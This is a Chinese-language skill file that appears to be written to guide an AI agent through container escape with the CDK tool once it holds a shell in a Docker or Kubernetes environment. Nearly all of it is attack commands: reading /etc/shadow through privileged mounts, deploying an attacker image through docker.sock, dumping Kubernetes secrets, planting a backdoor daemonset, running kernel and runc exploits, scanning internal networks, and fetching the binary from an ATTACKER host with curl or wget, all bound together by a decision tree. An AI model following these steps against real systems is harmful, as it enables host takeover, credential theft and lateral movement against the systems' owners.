---
name: cdk-escape
description: "使用 CDK 进行容器环境渗透和逃逸。当已进入容器环境（Docker/K8s Pod）需要评估逃逸可能性、利用容器漏洞、或进行容器内信息收集时使用。CDK 集成了容器环境评估、多种逃逸技术（privileged/mount/cgroup/lxcfs/runc/内核漏洞）、容器内横向移动。拿到容器 shell 后第一步就应该运行 CDK 评估。涉及容器逃逸、Docker 渗透、K8s 安全、容器提权的场景使用此技能"
metadata:
  tags: "cdk,container,docker,kubernetes,k8s,escape,逃逸,容器,privileged,cgroup,runc,pod"
  category: "tool"
---

# CDK 容器渗透与逃逸

CDK 是容器渗透的瑞士军刀——**一个二进制解决容器内信息收集、漏洞检测、逃逸利用**。拿到容器 shell 后，先跑 CDK 评估，再选逃逸路径。

项目地址：https://github.com/cdk-team/CDK

## 第一步：环境评估

进入容器后立即运行评估，CDK 会自动检测所有可能的逃逸路径：

```bash
# 全自动评估（推荐首选）
cdk evaluate

# 评估输出会列出：
# - 容器运行时类型（Docker/containerd/CRI-O）
# - 容器权限（privileged/capabilities）
# - 可利用的挂载点
# - 可用的逃逸技术
# - K8s Service Account Token
# - 网络信息
```

## 逃逸技术

### 特权容器逃逸

```bash
# 检测到 privileged=true 时
cdk run mount-cgroup "cat /etc/shadow"
# 或
cdk run mount-disk

# 通过 /dev 设备逃逸
cdk run mount-procfs "cat /etc/shadow"
```

### capabilities 逃逸

```bash
# CAP_SYS_ADMIN
cdk run mount-cgroup "whoami"

# CAP_DAC_READ_SEARCH
cdk run cap-dac-read-search

# CAP_SYS_PTRACE
cdk run check-ptrace
cdk run shim-pwn  # containerd-shim 提权
```

### Docker Socket 逃逸

```bash
# 发现挂载了 /var/run/docker.sock
cdk run docker-sock-check
cdk run docker-sock-deploy "attacker_image"
```

### K8s 逃逸

```bash
# 利用 Service Account Token
cdk run k8s-secret-dump
cdk run k8s-configmap-dump

# 创建特权 Pod 逃逸
cdk run k8s-backdoor-daemonset
```

### 内核漏洞逃逸

```bash
# CVE-2021-22555 (Netfilter)
cdk run exploit-CVE-2021-22555

# CVE-2022-0847 (DirtyPipe)
cdk run exploit-CVE-2022-0847

# runc CVE-2019-5736
cdk run runc-pwn
```

## 容器内信息收集

```bash
# 扫描内网服务（容器网络内）
cdk run service-probe 10.0.0.0/24

# 探测 K8s API Server
cdk run k8s-service-discovery

# 获取元数据服务（云环境）
cdk run cloud-metadata
```

## 工具投递

CDK 是静态编译的单二进制文件，投递到容器很方便：

```bash
# 方式 1：通过 Web 漏洞下载
curl -o /tmp/cdk https://ATTACKER/cdk && chmod +x /tmp/cdk

# 方式 2：通过 Python 临时 HTTP 服务
# 攻击机：python3 -m http.server 8000
# 容器内：wget http://ATTACKER:8000/cdk -O /tmp/cdk && chmod +x /tmp/cdk
```

## 决策树

```
进入容器后：
├─ 第一步：cdk evaluate（自动评估所有逃逸路径）
├─ privileged=true → cdk run mount-cgroup / mount-disk
├─ 有 docker.sock → cdk run docker-sock-deploy
├─ 有 K8s SA Token → cdk run k8s-secret-dump
├─ 有 capabilities → 对应 capability 的利用
├─ 以上都没有 → 检查内核版本，尝试内核漏洞
└─ 也逃不了 → 容器内横向（service-probe 扫网段）
```
